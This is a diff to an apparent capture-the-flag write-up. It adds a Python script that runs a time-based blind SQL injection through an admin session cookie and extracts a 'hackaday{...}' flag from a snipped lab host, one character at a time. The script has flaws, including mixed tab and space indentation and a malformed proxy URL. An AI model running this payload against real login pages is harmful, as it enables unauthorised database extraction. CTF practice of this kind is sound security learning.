@@ -405,7 +405,50 @@ Again, if you have the confidence, you can directly skip Step 2 and 3 as well.
 To determine the actual value, it's best to apply an automated script:
 
 ```
-Script writing in progress
+import urllib
+import requests
+import string
+import urllib
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http:127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+
+
+url_form = "http://[..snip..]/admin/adminlogon.php"
+#payload = "'%2b(select+sleep(10)+from+dual+where+(select+*+from+flag+where+flag+like+'%25hackaday{}%25'+limit+0,1)+like+'%25')%23%2b'"
+#cookies = {"admin_session_id": "c92797db11bd65128c08121a7fe5f080"+payload, "session_id": "903da9688d0a0d2a8d04f36da0af44a1"}
+possible_chars = list("{}+?_" + string.digits + string.ascii_lowercase + string.ascii_uppercase)
+headers = {
+   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
+   }
+
+found_chars = ""
+while True:
+    for new_char in possible_chars:
+	attempt = found_chars + new_char
+	attempt = attempt.replace("_","[_]")
+        print("[*] Attempt: '{}'.".format(attempt))
+        payload_1 = "'%2b(select+sleep(10)+from+dual+where+(select+*+from+flag+where+flag+like+'%25"
+        payload_2 = attempt
+        payload_3 = "%25'+limit+0,1)+like+'%25')%23%2b'"
+        payload = payload_1+payload_2+payload_3
+        #payload = "'%2b(select+sleep(10)+from+dual+where+(select+*+from+flag+where+flag+like+'%25hackaday{attempt}%25'+limit+0,1)+like+'%25')%23%2b'"
+        cookies = {"admin_session_id": "c92797db11bd65128c08121a7fe5f080"+payload, "session_id": "903da9688d0a0d2a8d04f36da0af44a1"}
+        #data = payload.format(attempt)
+        #print("[*] Payload: {}.".format(data))
+        page = requests.get(url_form, cookies=cookies, verify=False, proxies=proxies, headers=headers)
+    
+        if int(page.elapsed.total_seconds()) > 5:
+            found_chars += new_char
+            print("[*] Found chars: '{}'".format(found_chars))
+            break
+    
+    if found_chars[-1] == "}":
+        break
+        
+print("The FLAG is: {}".format(found_chars))
 ```
 
 
